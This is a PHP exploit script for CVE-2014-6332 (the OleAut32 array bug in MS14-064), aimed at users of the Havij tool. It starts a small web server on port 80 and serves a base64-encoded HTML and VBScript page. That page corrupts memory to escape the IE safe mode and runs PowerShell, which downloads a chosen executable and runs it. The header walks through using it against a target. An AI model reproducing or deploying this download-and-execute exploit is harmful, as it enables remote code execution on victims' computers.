#!/usr/bin/php
<?php
# Title : Havij OLE Automation Array Remote Code Execution
# Affected Versions: All Version
# Founder : ITSecTeam
# Tested on Windows 7 / Server 2008
#
#
# Author      :   Mohammad Reza Espargham
# Linkedin    :   https://ir.linkedin.com/in/rezasp
# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
# Website     :   www.reza.es
# Twitter     :   https://twitter.com/rezesp
# FaceBook    :   https://www.facebook.com/mohammadreza.espargham
#
#
# OleAut32.dll Exploit MS14-064 CVE2014-6332
#
#
# 1 . run php code : php havij.php
# 2 . open "Havij" and Enter your exploit link http://ipaddress:80/
# 3 . go to "Setting" and Click "Load Cookie"
# 4 . Your Link Download/Execute on your target
# 5 . Finished ;)
 
#Youtube : https://www.youtube.com/watch?v=svU8SuJhaVY
     
$port=80; # Port Address
$link="http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe"; # Your exe link
 
$reza = socket_create(AF_INET, SOCK_STREAM, 0) or die('Failed to create socket!');
socket_bind($reza, 0,$port);
socket_listen($reza);
print "    Mohammad Reza Espargham\n   www.reza.es\n\nYour Link = http://ipaddress:$port / http://127.0.0.1:$port\n\n";
     
    $msg = 'PGh0bWw+CjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9RW11
    bGF0ZUlFOCIgPgo8aGVhZD4KPC9oZWFkPgo8Ym9keT4KIAo8U0NSSVBUIExBTkdVQUdFPSJWQlNj
    cmlwdCI+CgpmdW5jdGlvbiBydW5tdW1hYSgpIApPbiBFcnJvciBSZXN1bWUgTmV4dApzZXQgc2hl
    bGw9Y3JlYXRlb2JqZWN0KCJTaGVsbC5BcHBsaWNhdGlvbiIpCmNvbW1hbmQ9Ikludm9rZS1FeHBy
    ZXNzaW9uICQoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdG
    SUxFX0RPV05MT0FEJywnbG9hZC5leGUnKTskKE5ldy1PYmplY3QgLWNvbSBTaGVsbC5BcHBsaWNh
    dGlvbikuU2hlbGxFeGVjdXRlKCdsb2FkLmV4ZScpOyIKc2hlbGwuU2hlbGxFeGVjdXRlICJwb3dl
    cnNoZWxsLmV4ZSIsICItQ29tbWFuZCAiICYgY29tbWFuZCwgIiIsICJydW5hcyIsIDAKZW5kIGZ1
    bmN0aW9uCjwvc2NyaXB0PgogCjxTQ1JJUFQgTEFOR1VBR0U9IlZCU2NyaXB0Ij4KICAKZGltICAg
    YWEoKQpkaW0gICBhYigpCmRpbSAgIGEwCmRpbSAgIGExCmRpbSAgIGEyCmRpbSAgIGEzCmRpbSAg
    IHdpbjl4CmRpbSAgIGludFZlcnNpb24KZGltICAgcm5kYQpkaW0gICBmdW5jbGFzcwpkaW0gICBt
    eWFycmF5CiAKQmVnaW4oKQogCmZ1bmN0aW9uIEJlZ2luKCkKICBPbiBFcnJvciBSZXN1bWUgTmV4
    dAogIGluZm89TmF2aWdhdG9yLlVzZXJBZ2VudAogCiAgaWYoaW5zdHIoaW5mbywiV2luNjQiKT4w
    KSAgIHRoZW4KICAgICBleGl0ICAgZnVuY3Rpb24KICBlbmQgaWYKIAogIGlmIChpbnN0cihpbmZv
    LCJNU0lFIik+MCkgICB0aGVuIAogICAgICAgICAgICAgaW50VmVyc2lvbiA9IENJbnQoTWlkKGlu
    Zm8sIEluU3RyKGluZm8sICJNU0lFIikgKyA1LCAyKSkgICAKICBlbHNlCiAgICAgZXhpdCAgIGZ1
    bmN0aW9uICAKICAgICAgICAgICAgICAKICBlbmQgaWYKIAogIHdpbjl4PTAKIAogIEJlZ2luSW5p
    dCgpCiAgSWYgQ3JlYXRlKCk9VHJ1ZSBUaGVuCiAgICAgbXlhcnJheT0gICAgICAgIGNocncoMDEp
    JmNocncoMjE3NikmY2hydygwMSkmY2hydygwMCkmY2hydygwMCkmY2hydygwMCkmY2hydygwMCkm
    Y2hydygwMCkKICAgICBteWFycmF5PW15YXJyYXkmY2hydygwMCkmY2hydygzMjc2NykmY2hydygw
    MCkmY2hydygwKQogCiAgICAgaWYoaW50VmVyc2lvbjw0KSB0aGVuCiAgICAgICAgIGRvY3VtZW50
    LndyaXRlKCI8YnI+IElFIikKICAgICAgICAgZG9jdW1lbnQud3JpdGUoaW50VmVyc2lvbikKICAg
    ICAgICAgcnVuc2hlbGxjb2RlKCkgICAgICAgICAgICAgICAgICAgIAogICAgIGVsc2UgIAogICAg
    ICAgICAgc2V0bm90c2FmZW1vZGUoKQogICAgIGVuZCBpZgogIGVuZCBpZgplbmQgZnVuY3Rpb24K
    IApmdW5jdGlvbiBCZWdpbkluaXQoKQogICBSYW5kb21pemUoKQogICByZWRpbSBhYSg1KQogICBy
    ZWRpbSBhYig1KQogICBhMD0xMysxNypybmQoNikKICAgYTM9NyszKnJuZCg1KQplbmQgZnVuY3Rp
    b24KIApmdW5jdGlvbiBDcmVhdGUoKQogIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgZGltIGkKICBD
    cmVhdGU9RmFsc2UKICBGb3IgaSA9IDAgVG8gNDAwCiAgICBJZiBPdmVyKCk9VHJ1ZSBUaGVuCiAg
    ICAgICBDcmVhdGU9VHJ1ZQogICAgICAgRXhpdCBGb3IKICAgIEVuZCBJZiAKICBOZXh0CmVuZCBm
    dW5jdGlvbgogCnN1YiB0ZXN0YWEoKQplbmQgc3ViCiAKZnVuY3Rpb24gbXlkYXRhKCkKICAgIE9u
    IEVycm9yIFJlc3VtZSBOZXh0CiAgICAgaT10ZXN0YWEKICAgICBpPW51bGwKICAgICByZWRpbSAg
    UHJlc2VydmUgYWEoYTIpICAKICAgCiAgICAgYWIoMCk9MAogICAgIGFhKGExKT1pCiAgICAgYWIo
    MCk9Ni4zNjU5ODczNzQzNzgwMUUtMzE0CiAKICAgICBhYShhMSsyKT1teWFycmF5CiAgICAgYWIo
    Mik9MS43NDA4ODUzNDczMTMyNEUtMzEwICAKICAgICBteWRhdGE9YWEoYTEpCiAgICAgcmVkaW0g
    IFByZXNlcnZlIGFhKGEwKSAgCmVuZCBmdW5jdGlvbiAKIAogCmZ1bmN0aW9uIHNldG5vdHNhZmVt
    b2RlKCkKICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgICBpPW15ZGF0YSgpICAKICAgIGk9cnVt
    KGkrOCkKICAgIGk9cnVtKGkrMTYpCiAgICBqPXJ1bShpKyZoMTM0KSAgCiAgICBmb3Igaz0wIHRv
    ICZoNjAgc3RlcCA0CiAgICAgICAgaj1ydW0oaSsmaDEyMCtrKQogICAgICAgIGlmKGo9MTQpIHRo
    ZW4KICAgICAgICAgICAgICBqPTAgICAgICAgICAgCiAgICAgICAgICAgICAgcmVkaW0gIFByZXNl
    cnZlIGFhKGEyKSAgICAgICAgICAgICAKICAgICBhYShhMSsyKShpKyZoMTFjK2spPWFiKDQpCiAg
    ICAgICAgICAgICAgcmVkaW0gIFByZXNlcnZlIGFhKGEwKSAgCiAKICAgICBqPTAgCiAgICAgICAg
    ICAgICAgaj1ydW0oaSsmaDEyMCtrKSAgIAogICAgICAgICAgCiAgICAgICAgICAgICAgIEV4aXQg
    Zm9yCiAgICAgICAgICAgZW5kIGlmCiAKICAgIG5leHQgCiAgICBhYigyKT0xLjY5NzU5NjYzMzE2
    NzQ3RS0zMTMKICAgIHJ1bm11bWFhKCkgCmVuZCBmdW5jdGlvbgogCmZ1bmN0aW9uIE92ZXIoKQog
    ICAgT24gRXJyb3IgUmVzdW1lIE5leHQKICAgIGRpbSB0eXBlMSx0eXBlMix0eXBlMwogICAgT3Zl
    cj1GYWxzZQogICAgYTA9YTArYTMKICAgIGExPWEwKzIKICAgIGEyPWEwKyZoODAwMDAwMAogICAK
    ICAgIHJlZGltICBQcmVzZXJ2ZSBhYShhMCkgCiAgICByZWRpbSAgIGFiKGEwKSAgICAgCiAgIAog
    ICAgcmVkaW0gIFByZXNlcnZlIGFhKGEyKQogICAKICAgIHR5cGUxPTEKICAgIGFiKDApPTEuMTIz
    NDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwCiAgICBhYShhMCk9MTAKICAgICAgICAgICAKICAg
    IElmKElzT2JqZWN0KGFhKGExLTEpKSA9IEZhbHNlKSBUaGVuCiAgICAgICBpZihpbnRWZXJzaW9u
    PDQpIHRoZW4KICAgICAgICAgICBtZW09Y2ludChhMCsxKSoxNiAgICAgICAgICAgICAKICAgICAg
    ICAgICBqPXZhcnR5cGUoYWEoYTEtMSkpCiAgICAgICAgICAgaWYoKGo9bWVtKzQpIG9yIChqKjg9
    bWVtKzgpKSB0aGVuCiAgICAgICAgICAgICAgaWYodmFydHlwZShhYShhMS0xKSk8PjApICBUaGVu
    ICAgIAogICAgICAgICAgICAgICAgIElmKElzT2JqZWN0KGFhKGExKSkgPSBGYWxzZSApIFRoZW4g
    ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICB0eXBlMT1WYXJUeXBlKGFhKGExKSkKICAg
    ICAgICAgICAgICAgICBlbmQgaWYgICAgICAgICAgICAgICAKICAgICAgICAgICAgICBlbmQgaWYK
    ICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICByZWRpbSAgUHJlc2VydmUgYWEoYTApCiAgICAg
    ICAgICAgICBleGl0ICBmdW5jdGlvbgogCiAgICAgICAgICAgZW5kIGlmIAogICAgICAgIGVsc2UK
    ICAgICAgICAgICBpZih2YXJ0eXBlKGFhKGExLTEpKTw+MCkgIFRoZW4gICAgCiAgICAgICAgICAg
    ICAgSWYoSXNPYmplY3QoYWEoYTEpKSA9IEZhbHNlICkgVGhlbgogICAgICAgICAgICAgICAgICB0
    eXBlMT1WYXJUeXBlKGFhKGExKSkKICAgICAgICAgICAgICBlbmQgaWYgICAgICAgICAgICAgICAK
    ICAgICAgICAgICAgZW5kIGlmCiAgICAgICAgZW5kIGlmCiAgICBlbmQgaWYKICAgICAgICAgICAg
    ICAgCiAgICAgCiAgICBJZih0eXBlMT0maDJmNjYpIFRoZW4gICAgICAgICAKICAgICAgICAgIE92
    ZXI9VHJ1ZSAgICAgIAogICAgRW5kIElmICAKICAgIElmKHR5cGUxPSZoQjlBRCkgVGhlbgogICAg
    ICAgICAgT3Zlcj1UcnVlCiAgICAgICAgICB3aW45eD0xCiAgICBFbmQgSWYgIAogCiAgICByZWRp
    bSAgUHJlc2VydmUgYWEoYTApICAgICAgICAgIAogICAgICAgICAKZW5kIGZ1bmN0aW9uCiAKZnVu
    Y3Rpb24gcnVtKGFkZCkgCiAgICBPbiBFcnJvciBSZXN1bWUgTmV4dAogICAgcmVkaW0gIFByZXNl
    cnZlIGFhKGEyKSAgCiAgIAogICAgYWIoMCk9MCAgIAogICAgYWEoYTEpPWFkZCs0ICAgICAKICAg
    IGFiKDApPTEuNjk3NTk2NjMzMTY3NDdFLTMxMyAgICAgICAKICAgIHJ1bT1sZW5iKGFhKGExKSkg
    IAogICAgCiAgICBhYigwKT0wCiAgICByZWRpbSAgUHJlc2VydmUgYWEoYTApCmVuZCBmdW5jdGlv
    bgogCjwvc2NyaXB0PgogCjwvYm9keT4KPC9odG1sPg==';
    $msgd=base64_decode($msg);
    $msgd=str_replace("FILE_DOWNLOAD",$link,$msgd);
     
for (;;) {
        if ($client = @socket_accept($reza)) {
            socket_write($client, "HTTP/1.1 200 OK\r\n" .
            "Content-length: " . strlen($msgd) . "\r\n" .
            "Content-Type: text/html; charset=UTF-8\r\n\r\n" .
            $msgd);
            print "\n Target Checked Your Link \n";
        }
        else usleep(100000);
}
 
 
?>
